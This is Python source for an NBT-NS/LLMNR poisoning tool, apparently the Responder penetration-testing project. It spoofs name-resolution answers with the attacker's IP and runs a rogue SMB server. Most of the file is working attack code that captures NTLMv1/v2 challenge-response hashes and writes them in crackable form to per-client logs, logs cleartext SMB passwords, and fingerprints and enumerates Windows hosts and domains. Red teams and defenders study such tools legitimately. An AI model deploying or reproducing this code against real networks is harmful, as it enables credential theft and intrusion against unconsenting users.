#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler,BaseServer
from Fingerprint import RunSmbFinger,OsNameClientVersion
from odict import OrderedDict
from socket import inet_aton
from random import randrange
from SMBPackets import *
from SQLPackets import *
from RAPLANMANPackets import *
from HTTPPackets import *
from HTTPProxy import *
from LDAPPackets import *
from SMTPPackets import *
from IMAPPackets import *
from OpenSSL import SSL

import sys
import struct
import SocketServer
import logging
import re
import socket
import threading
import Fingerprint
import random
import os
import ConfigParser
import BaseHTTPServer
import select
import urlparse
import zlib
import string
import time

formatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
responder_logger = logging.getLogger('responder')
fileHandler = logging.FileHandler("./logs/responder/Responder-Session.log")
fileHandler.setFormatter(formatter)
responder_logger.addHandler(fileHandler)

Log2Filename = "./logs/responder/LLMNR-NBT-NS.log"
logger2 = logging.getLogger('LLMNR/NBT-NS')
logger2.addHandler(logging.FileHandler(Log2Filename,'a'))

AnalyzeFilename = "./logs/responder/Analyze-LLMNR-NBT-NS.log"
logger3 = logging.getLogger('Analyze LLMNR/NBT-NS')
logger3.addHandler(logging.FileHandler(AnalyzeFilename,'a'))

def IsOsX():
	Os_version = sys.platform
	if Os_version == "darwin":
		return True
	else:
		return False

def OsInterfaceIsSupported(INTERFACE):
	if INTERFACE != "Not set":
		if IsOsX():
			return False
		else:
			return True
	if INTERFACE == "Not set":
		return False

def Analyze(AnalyzeMode):
	if AnalyzeMode == True:
		return True
	else:
		return False

#Function used to write captured hashs to a file.
def WriteData(outfile,data, user):
	if os.path.isfile(outfile) == False:
		with open(outfile,"w") as outf:
			outf.write(data)
			outf.write("\n")
			outf.close()
	if os.path.isfile(outfile) == True:
		with open(outfile,"r") as filestr:
			if re.search(user.encode('hex'), filestr.read().encode('hex')):
				filestr.close()
				return False
			if re.search(re.escape("$"), user):
				filestr.close()
				return False
			else:
				with open(outfile,"a") as outf2:
					outf2.write(data)
					outf2.write("\n")
					outf2.close()

def PrintData(outfile,user):
	if Verbose == True:
		return True
	if os.path.isfile(outfile) == True:
		with open(outfile,"r") as filestr:
			if re.search(user.encode('hex'), filestr.read().encode('hex')):
				filestr.close()
				return False
			if re.search(re.escape("$"), user):
				filestr.close()
				return False
			else:
				return True
	else:
		return True

def PrintLLMNRNBTNS(outfile,Message):
	if Verbose == True:
		return True
	if os.path.isfile(outfile) == True:
		with open(outfile,"r") as filestr:
			if re.search(re.escape(Message), filestr.read()):
				filestr.close()
				return False
			else:
				return True
	else:
		return True

#Packet class handling all packet generation (see odict.py).
class Packet():
	fields = OrderedDict([
		("data", ""),
	])
	def __init__(self, **kw):
		self.fields = OrderedDict(self.__class__.fields)
		for k,v in kw.items():
			if callable(v):
				self.fields[k] = v(self.fields[k])
			else:
				self.fields[k] = v
	def __str__(self):
		return "".join(map(str, self.fields.values()))

#Function name self-explanatory
def Is_Finger_On(Finger_On_Off):
	if Finger_On_Off == True:
		return True
	if Finger_On_Off == False:
		return False

def RespondToSpecificHost(RespondTo):
	if len(RespondTo)>=1 and RespondTo != ['']:
		return True
	else:
		return False

def RespondToSpecificName(RespondToName):
	if len(RespondToName)>=1 and RespondToName != ['']:
		return True
	else:
		return False

def RespondToIPScope(RespondTo, ClientIp):
	if ClientIp in RespondTo:
		return True
	else:
		return False

def RespondToNameScope(RespondToName, Name):
	if Name in RespondToName:
		return True
	else:
		return False

##Dont Respond to these hosts/names.
def DontRespondToSpecificHost(DontRespondTo):
	if len(DontRespondTo)>=1 and DontRespondTo != ['']:
		return True
	else:
		return False

def DontRespondToSpecificName(DontRespondToName):
	if len(DontRespondToName)>=1 and DontRespondToName != ['']:
		return True
	else:
		return False

def DontRespondToIPScope(DontRespondTo, ClientIp):
	if ClientIp in DontRespondTo:
		return True
	else:
		return False

def DontRespondToNameScope(DontRespondToName, Name):
	if Name in DontRespondToName:
		return True
	else:
		return False
##################################################################################
#NBT NS Stuff
##################################################################################

#NBT-NS answer packet.
class NBT_Ans(Packet):
	fields = OrderedDict([
		("Tid",           ""),
		("Flags",         "\x85\x00"),
		("Question",      "\x00\x00"),
		("AnswerRRS",     "\x00\x01"),
		("AuthorityRRS",  "\x00\x00"),
		("AdditionalRRS", "\x00\x00"),
		("NbtName",       ""),
		("Type",          "\x00\x20"),
		("Classy",        "\x00\x01"),
		("TTL",           "\x00\x00\x00\xa5"),
		("Len",           "\x00\x06"),
		("Flags1",        "\x00\x00"),
		("IP",            "\x00\x00\x00\x00"),
	])

	def calculate(self,data):
		self.fields["Tid"] = data[0:2]
		self.fields["NbtName"] = data[12:46]
		self.fields["IP"] = inet_aton(OURIP)

def NBT_NS_Role(data):
	Role = {
		"\x41\x41\x00":"Workstation/Redirector Service.",
		"\x42\x4c\x00":"Domain Master Browser. This name is likely a domain controller or a homegroup.)",
		"\x42\x4d\x00":"Domain controller service. This name is a domain controller.",
		"\x42\x4e\x00":"Local Master Browser.",
		"\x42\x4f\x00":"Browser Election Service.",
		"\x43\x41\x00":"File Server Service.",
		"\x41\x42\x00":"Browser Service.",
	}

	if data in Role:
		return Role[data]
	else:
		return "Service not known."

# Define what are we answering to.
def Validate_NBT_NS(data,Wredirect):
	if Analyze(AnalyzeMode):
		return False

	if NBT_NS_Role(data[43:46]) == "File Server Service.":
		return True

	if NBTNSDomain == True:
		if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
			return True

	if Wredirect == True:
		if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service.":
			return True

	else:
		return False

def Decode_Name(nbname):
	#From http://code.google.com/p/dpkt/ with author's permission.
	try:
		if len(nbname) != 32:
			return nbname
		l = []
		for i in range(0, 32, 2):
			l.append(chr(((ord(nbname[i]) - 0x41) << 4) |
					   ((ord(nbname[i+1]) - 0x41) & 0xf)))
		return filter(lambda x: x in string.printable, ''.join(l).split('\x00', 1)[0].replace(' ', ''))
	except:
		return "Illegal NetBIOS name"

# NBT_NS Server class.
class NB(BaseRequestHandler):

	def handle(self):
		data, socket = self.request
		Name = Decode_Name(data[13:45])

		if DontRespondToSpecificHost(DontRespondTo):
			if RespondToIPScope(DontRespondTo, self.client_address[0]):
				return None

		if DontRespondToSpecificName(DontRespondToName) and DontRespondToNameScope(DontRespondToName.upper(), Name.upper()):
			return None 

		if Analyze(AnalyzeMode):
			if data[2:4] == "\x01\x10":
				if Is_Finger_On(Finger_On_Off):
					try:
						Finger = RunSmbFinger((self.client_address[0],445))
						Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1])
						logger3.warning(Message)
					except Exception:
						Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s\n"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
						logger3.warning(Message)
					if PrintLLMNRNBTNS(AnalyzeFilename,Message):
						print Message
				else:
					Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
					if PrintLLMNRNBTNS(AnalyzeFilename,Message):
						print Message
					logger3.warning(Message)

		if RespondToSpecificHost(RespondTo) and Analyze(AnalyzeMode) == False:
			if RespondToIPScope(RespondTo, self.client_address[0]):
				if data[2:4] == "\x01\x10":
					if Validate_NBT_NS(data,Wredirect):
						if RespondToSpecificName(RespondToName) == False:
							buff = NBT_Ans()
							buff.calculate(data)
							for x in range(1):
								socket.sendto(str(buff), self.client_address)
								Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
								responder_logger.info(Message)
								if PrintLLMNRNBTNS(Log2Filename,Message):
									#print Message
									logger2.warning(Message)
								if Is_Finger_On(Finger_On_Off):
									try:
										Finger = RunSmbFinger((self.client_address[0],445))
										#print '[+] OsVersion is:%s'%(Finger[0])
										#print '[+] ClientVersion is :%s'%(Finger[1])
										responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
										responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
									except Exception:
										responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
										pass
						if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
							buff = NBT_Ans()
							buff.calculate(data)
							for x in range(1):
								socket.sendto(str(buff), self.client_address)
								Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
								responder_logger.info(Message)
								if PrintLLMNRNBTNS(Log2Filename,Message):
									#print Message
									logger2.warning(Message)
								if Is_Finger_On(Finger_On_Off):
									try:
										Finger = RunSmbFinger((self.client_address[0],445))
										#print '[+] OsVersion is:%s'%(Finger[0])
										#print '[+] ClientVersion is :%s'%(Finger[1])
										responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
										responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
									except Exception:
										responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
										pass
						else:
							pass
			else:
				pass

		else:
			if data[2:4] == "\x01\x10":
				if Validate_NBT_NS(data,Wredirect) and Analyze(AnalyzeMode) == False:
					if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
						buff = NBT_Ans()
						buff.calculate(data)
						for x in range(1):
							socket.sendto(str(buff), self.client_address)
						Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
						responder_logger.info(Message)
						if PrintLLMNRNBTNS(Log2Filename,Message):
							#print Message
							logger2.warning(Message)
						if Is_Finger_On(Finger_On_Off):
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								#print '[+] OsVersion is:%s'%(Finger[0])
								#print '[+] ClientVersion is :%s'%(Finger[1])
								responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
								responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
							except Exception:
								responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
								pass
					if RespondToSpecificName(RespondToName) == False:
						buff = NBT_Ans()
						buff.calculate(data)
						for x in range(1):
							socket.sendto(str(buff), self.client_address)
						Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
						responder_logger.info(Message)
						if PrintLLMNRNBTNS(Log2Filename,Message):
							#print Message
							logger2.warning(Message)
						if Is_Finger_On(Finger_On_Off):
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								#print '[+] OsVersion is:%s'%(Finger[0])
								#print '[+] ClientVersion is :%s'%(Finger[1])
								responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
								responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
							except Exception:
								responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
								pass
					else:
						pass

##################################################################################
#Browser Listener and Lanman Finger
##################################################################################

def WorkstationFingerPrint(data):
	Role = {
		"\x04\x00"    :"Windows 95",
		"\x04\x10"    :"Windows 98",
		"\x04\x90"    :"Windows ME",
		"\x05\x00"    :"Windows 2000",
		"\x05\x00"    :"Windows XP",
		"\x05\x02"    :"Windows 2003",
		"\x06\x00"    :"Windows Vista/Server 2008",
		"\x06\x01"    :"Windows 7/Server 2008R2",
	}

	if data in Role:
		return Role[data]
	else:
		return False

def PrintServerName(data, entries):
	if entries == 0:
		pass
	else:
		entrieslen = 26*entries
		chunks, chunk_size = len(data[:entrieslen]), entrieslen/entries
		ServerName = [data[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
		l =[]
		for x in ServerName:
			if WorkstationFingerPrint(x[16:18]):
				l.append(x[:16].replace('\x00', '')+'\n       [-]Os version is:%s'%(WorkstationFingerPrint(x[16:18])))
			else:
				l.append(x[:16].replace('\x00', ''))

		return l

def ParsePacket(Payload):
	PayloadOffset = struct.unpack('<H',Payload[51:53])[0]
	StatusCode = Payload[PayloadOffset-4:PayloadOffset-2]
	if StatusCode == "\x00\x00":
		EntriesNum = struct.unpack('<H',Payload[PayloadOffset:PayloadOffset+2])[0]
		ParsedNames = PrintServerName(Payload[PayloadOffset+4:], EntriesNum)
		return ParsedNames
	else:
		return None

def RAPThisDomain(Client,Domain):
	try:
		l =[]
		for x in range(1):
			PDC = RapFinger(Client,Domain,"\x00\x00\x00\x80")
			if PDC is not None:
				l.append('[Analyze mode LANMAN]:')
				l.append('[!]Domain detected on this network:')
				for x in PDC:
					l.append('   -'+x)
			SQL = RapFinger(Client,Domain,"\x04\x00\x00\x00")
			if SQL is not None:
				l.append('[!]SQL Server detected on Domain %s:'%(Domain))
				for x in SQL:
					l.append('   -'+x)
			WKST = RapFinger(Client,Domain,"\xff\xff\xff\xff")
			if WKST is not None:
				l.append('[!]Workstations/Servers detected on Domain %s:'%(Domain))
				for x in WKST:
					l.append('   -'+x)
			else:
				pass
			return '\n'.join(l)
	except:
		pass

def RapFinger(Host,Domain, Type):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((Host,445))
		s.settimeout(0.3)
		h = SMBHeader(cmd="\x72",mid="\x01\x00")
		n = SMBNegoData()
		n.calculate()
		packet0 = str(h)+str(n)
		buffer0 = longueur(packet0)+packet0
		s.send(buffer0)
		data = s.recv(1024)
		##Session Setup AndX Request, Anonymous.
		if data[8:10] == "\x72\x00":
			head = SMBHeader(cmd="\x73",mid="\x02\x00")
			t = SMBSessionData()
			t.calculate()
			final = t
			packet1 = str(head)+str(t)
			buffer1 = longueur(packet1)+packet1
			s.send(buffer1)
			data = s.recv(1024)
			##Tree Connect IPC$.
			if data[8:10] == "\x73\x00":
				head = SMBHeader(cmd="\x75",flag1="\x08", flag2="\x01\x00",uid=data[32:34],mid="\x03\x00")
				t = SMBTreeConnectData(Path="\\\\"+Host+"\\IPC$")
				t.calculate()
				packet1 = str(head)+str(t)
				buffer1 = longueur(packet1)+packet1
				s.send(buffer1)
				data = s.recv(1024)
				##Rap ServerEnum.
				if data[8:10] == "\x75\x00":
					head = SMBHeader(cmd="\x25",flag1="\x08", flag2="\x01\xc8",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x04\x00")
					t = SMBTransRAPData(Data=RAPNetServerEnum3Data(ServerType=Type,DetailLevel="\x01\x00",TargetDomain=Domain))
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = longueur(packet1)+packet1
					s.send(buffer1)
					data = s.recv(64736)
					##Rap ServerEnum, Get answer and return what we're looking for.
					if data[8:10] == "\x25\x00":
						s.close()
						return ParsePacket(data)
	except:
		return None

def BecomeBackup(data,Client):
	try:
		DataOffset = struct.unpack('<H',data[139:141])[0]
		BrowserPacket = data[82+DataOffset:]
		if BrowserPacket[0] == "\x0b":
			ServerName = BrowserPacket[1:]
			Domain = Decode_Name(data[49:81])
			Name = Decode_Name(data[15:47])
			Role = NBT_NS_Role(data[45:48])
			Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a Local Master Browser Backup on this domain: %s."%(Client, Name,Role,Domain)
			if PrintLLMNRNBTNS(AnalyzeFilename,Message):
				print Message
			if AnalyzeMode:
				Message1=RAPThisDomain(Client,Domain)
				if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
					print Message1
					logger3.warning(Message1)
			logger3.warning(Message)
	except:
		pass


	try:
		Domain = Decode_Name(data[49:81])
		Name = Decode_Name(data[15:47])
		Role1 = NBT_NS_Role(data[45:48])
		Role2 = NBT_NS_Role(data[79:82])
		Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s'%(Client, Name, Role1, Domain, Role2)
		if Role2 == "Domain controller service. This name is a domain controller." or Role2 == "Browser Election Service." or Role2 == "Local Master Browser.":
			if PrintLLMNRNBTNS(AnalyzeFilename,Message):
				print Message
			if AnalyzeMode:
				Message1=RAPThisDomain(Client,Domain)
				if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
					print Message1
					logger3.warning(Message1)
			logger3.warning(Message)
	except:
		pass

class Browser(BaseRequestHandler):

	def handle(self):
		try:
			request, socket = self.request
			if Analyze(AnalyzeMode):
				ParseDatagramNBTNames(request,self.client_address[0])
				BecomeBackup(request,self.client_address[0])
			BecomeBackup(request,self.client_address[0])
		except Exception:
			pass
##################################################################################
#SMB Server
##################################################################################

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
	SecBlobLen = struct.unpack('<H',data[51:53])[0]
	if SecBlobLen < 260:
		SSPIStart = data[75:]
		LMhashLen = struct.unpack('<H',data[89:91])[0]
		if LMhashLen == 0 or LMhashLen == 1:
			return True
		else:
			return False
	if SecBlobLen > 260:
		SSPIStart = data[79:]
		LMhashLen = struct.unpack('<H',data[93:95])[0]
		if LMhashLen == 0 or LMhashLen == 1:
			return True
		else:
			return False

def Is_LMNT_Anonymous(data):
	LMhashLen = struct.unpack('<H',data[51:53])[0]
	if LMhashLen == 0 or LMhashLen == 1:
		return True
	else:
		return False

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
	DialectStart = data[40:]
	pack = tuple(DialectStart.split('\x02'))[:10]
	var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
	test = tuple(var)
	if test[0] == "NT LM 0.12":
		return "\x00\x00"
	if test[1] == "NT LM 0.12":
		return "\x01\x00"
	if test[2] == "NT LM 0.12":
		return "\x02\x00"
	if test[3] == "NT LM 0.12":
		return "\x03\x00"
	if test[4] == "NT LM 0.12":
		return "\x04\x00"
	if test[5] == "NT LM 0.12":
		return "\x05\x00"
	if test[6] == "NT LM 0.12":
		return "\x06\x00"
	if test[7] == "NT LM 0.12":
		return "\x07\x00"
	if test[8] == "NT LM 0.12":
		return "\x08\x00"
	if test[9] == "NT LM 0.12":
		return "\x09\x00"
	if test[10] == "NT LM 0.12":
		return "\x0a\x00"

def ParseShare(data):
	packet = data[:]
	a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
	if a:
		quote = "Share requested: "+a.group(0)
		responder_logger.info(quote.replace('\x00',''))

#Parse SMB NTLMSSP v1/v2
def ParseSMBHash(data,client):
	SecBlobLen = struct.unpack('<H',data[51:53])[0]
	BccLen = struct.unpack('<H',data[61:63])[0]
	if SecBlobLen < 260:
		SSPIStart = data[75:]
		LMhashLen = struct.unpack('<H',data[89:91])[0]
		LMhashOffset = struct.unpack('<H',data[91:93])[0]
		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen = struct.unpack('<H',data[97:99])[0]
		NthashOffset = struct.unpack('<H',data[99:101])[0]

	if SecBlobLen > 260:
		SSPIStart = data[79:]
		LMhashLen = struct.unpack('<H',data[93:95])[0]
		LMhashOffset = struct.unpack('<H',data[95:97])[0]
		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen = struct.unpack('<H',data[101:103])[0]
		NthashOffset = struct.unpack('<H',data[103:105])[0]

	if NthashLen == 24:
		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[105:107])[0]
		DomainOffset = struct.unpack('<H',data[107:109])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[113:115])[0]
		UserOffset = struct.unpack('<H',data[115:117])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
		outfile = "./logs/responder/SMB-NTLMv1ESS-Client-"+client+".txt"
		if PrintData(outfile,User+"::"+Domain):
			#print "[+]SMB-NTLMv1 hash captured from : ",client
			#print "[+]SMB complete hash is :", writehash
			WriteData(outfile,writehash,User+"::"+Domain)
		responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))

	if NthashLen > 60:
		outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[109:111])[0]
		DomainOffset = struct.unpack('<H',data[111:113])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[117:119])[0]
		UserOffset = struct.unpack('<H',data[119:121])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
		if PrintData(outfile,User+"::"+Domain):
			#print "[+]SMB-NTLMv2 hash captured from : ",client
			#print "[+]SMB complete hash is :", writehash
			WriteData(outfile,writehash,User+"::"+Domain)
		responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))

#Parse SMB NTLMv1/v2
def ParseLMNTHash(data,client):
	try:
		lenght = struct.unpack('<H',data[43:45])[0]
		LMhashLen = struct.unpack('<H',data[51:53])[0]
		NthashLen = struct.unpack('<H',data[53:55])[0]
		Bcc = struct.unpack('<H',data[63:65])[0]
		if NthashLen > 25:
			Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
			responder_logger.info('[+]SMB-NTLMv2 hash captured from :%s'%(client))
			outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
			Username, Domain = tuple(var)
			Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
			if PrintData(outfile,Username+"::"+Domain):
				#print "[+]SMB-NTLMv2 hash captured from :",client
				#print "[+]SMB-NTLMv2 complete hash is :",Writehash
				ParseShare(data)
				WriteData(outfile,Writehash, Username+"::"+Domain)
			responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
		if NthashLen == 24:
			responder_logger.info('[+]SMB-NTLMv1 hash captured from :%s'%(client))
			outfile = "./logs/responder/SMB-NTLMv1-Client-"+client+".txt"
			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
			Username, Domain = tuple(var)
			writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
			if PrintData(outfile,Username+"::"+Domain):
				#print "[+]SMB-NTLMv1 hash captured from : ",client
				#print "[+]SMB complete hash is :", writehash
				ParseShare(data)
				WriteData(outfile,writehash, Username+"::"+Domain)
			responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
			responder_logger.info('[+]SMB-NTLMv1 Username:%s'%(Username))
			responder_logger.info('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
	except Exception:
		raise

def IsNT4ClearTxt(data):
	HeadLen = 36
	Flag2 = data[14:16]
	if Flag2 == "\x03\x80":
		SmbData = data[HeadLen+14:]
		WordCount = data[HeadLen]
		ChainedCmdOffset = data[HeadLen+1]
		if ChainedCmdOffset == "\x75":
			PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]
			if PassLen > 2:
				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
				#print "[SMB]Clear Text Credentials: %s:%s" %(User,Password)
				responder_logger.info("[SMB]Clear Text Credentials: %s:%s"%(User,Password))

#SMB Server class, NTLMSSP
class SMB1(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(1)
				##session request 139
				if data[0] == "\x81":
					buffer0 = "\x82\x00\x00\x00"
					self.request.send(buffer0)
					data = self.request.recv(1024)
				##Negotiate proto answer.
				if data[8:10] == "\x72\x00":
					#Customize SMB answer.
					head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
					t = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
					t.calculate()
					final = t
					packet0 = str(head)+str(final)
					buffer0 = longueur(packet0)+packet0
					self.request.send(buffer0)
					data = self.request.recv(1024)
					##Session Setup AndX Request
				if data[8:10] == "\x73\x00":
					IsNT4ClearTxt(data)
					head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
					t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
					t.calculate()
					final = t
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(4096)
					if data[8:10] == "\x73\x00":
						if Is_Anonymous(data):
							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
							final = SMBSessEmpty()
							packet1 = str(head)+str(final)
							buffer1 = longueur(packet1)+packet1
							self.request.send(buffer1)
						else:
							ParseSMBHash(data,self.client_address[0])
							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
							final = SMBSession2Accept()
							final.calculate()
							packet2 = str(head)+str(final)
							buffer2 = longueur(packet2)+packet2
							self.request.send(buffer2)
							data = self.request.recv(1024)
				##Tree Connect IPC Answer
				if data[8:10] == "\x75\x00":
					ParseShare(data)
					head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
					t = SMBTreeData()
					t.calculate()
					final = t
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##Tree Disconnect.
				if data[8:10] == "\x71\x00":
					head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##NT_CREATE Access Denied.
				if data[8:10] == "\xa2\x00":
					head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##Trans2 Access Denied.
				if data[8:10] == "\x25\x00":
					head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##LogOff.
				if data[8:10] == "\x74\x00":
					head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x02\xff\x00\x27\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)

		except Exception:
			pass #no need to print errors..

#SMB Server class, old version.
class SMB1LM(BaseRequestHandler):

	def handle(self):
		try:
			self.request.settimeout(0.5)
			data = self.request.recv(1024)
			##session request 139
			if data[0] == "\x81":
				buffer0 = "\x82\x00\x00\x00"
				self.request.send(buffer0)
				data = self.request.recv(1024)
				##Negotiate proto answer.
			if data[8:10] == "\x72\x00":
				head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
				t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
				t.calculate()
				packet1 = str(head)+str(t)
				buffer1 = longueur(packet1)+packet1
				self.request.send(buffer1)
				data = self.request.recv(1024)
				##Session Setup AndX Request
			if data[8:10] == "\x73\x00":
				if Is_LMNT_Anonymous(data):
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					packet1 = str(head)+str(SMBSessEmpty())
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
				else:
					ParseLMNTHash(data,self.client_address[0])
